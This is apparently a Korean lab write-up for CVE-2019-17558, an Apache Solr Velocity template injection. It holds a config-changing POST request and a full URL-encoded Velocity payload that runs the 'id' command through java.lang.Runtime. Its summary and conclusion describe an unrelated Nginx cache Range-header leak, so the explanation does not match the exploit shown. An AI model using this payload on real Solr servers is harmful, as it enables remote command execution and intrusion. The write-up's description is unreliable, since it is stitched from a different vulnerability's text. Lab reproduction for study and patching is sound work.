# CVE-2019-17558

**Contributors**

-   [박건호(@ian9292)](https://github.com/ian9292)
-   [오훈(@55hnnn)](http://github.com/55hnnn)

<br/>

### 요약

-   Nginx는 리버스 프록시 사이트에서 일부 파일을 캐시함, 특히 정적 파일을 캐시함. 이 캐시의 일부는 파일에 저장되며, 각 캐시 파일에는 "파일 헤더", "HTTP 응답 헤더", "HTTP 응답 본문"이 포함됨.
-   요청에 Range 헤더가 포함되면 Nginx는 지정된 시작 및 종료 위치에 따라 지정된 길이의 내용을 반환함. 두 개의 음수 위치를 구성하면, 예를 들어 (-600, -9223372036854774591), 음수 위치의 데이터를 읽을 수 있음.
-   이 요청이 캐시 파일에 일치하면 캐시 파일 내의 "HTTP 응답 본문" 앞에 있는 "파일 헤더", "HTTP 응답 헤더" 등의 내용을 읽을 수 있음.

<br/>

### 환경 구성 및 실행

-   `docker compose up -d`를 실행하여 테스트 환경을 실행함.
-   `http://your-ip:8983/solr/admin/cores?indexInfo=false&wt=json`API에 접속하여 solr core의 이름을 확인함.
![](1_check_core.png)
-   `params.resource.loader.enabled`옵션이 활성화 되어있어야 함. `/solr/[core_name]/config` API를 통해 해당 옵션을 확인. 만약, 비활성화 되어있을 경우, 다음 요청을 통해 해당 옵션을 활성화
```
POST /solr/demo/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```
![](2_check_loader.png)
- Velocity Template을 통한 취약점 트리거
```http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

<br/>

### 결과

![](result.png)

<br/>

### 정리

-   이 취약점은 공격자가 Nginx 서버의 캐시 파일에서 예상치 못한 데이터를 읽을 수 있게 만들어, 정보 유출의 위험이 있음. 안전한 웹 서비스 운영을 위해서는 이러한 취약점을 주기적으로 확인하고 패치하는 것이 중요함.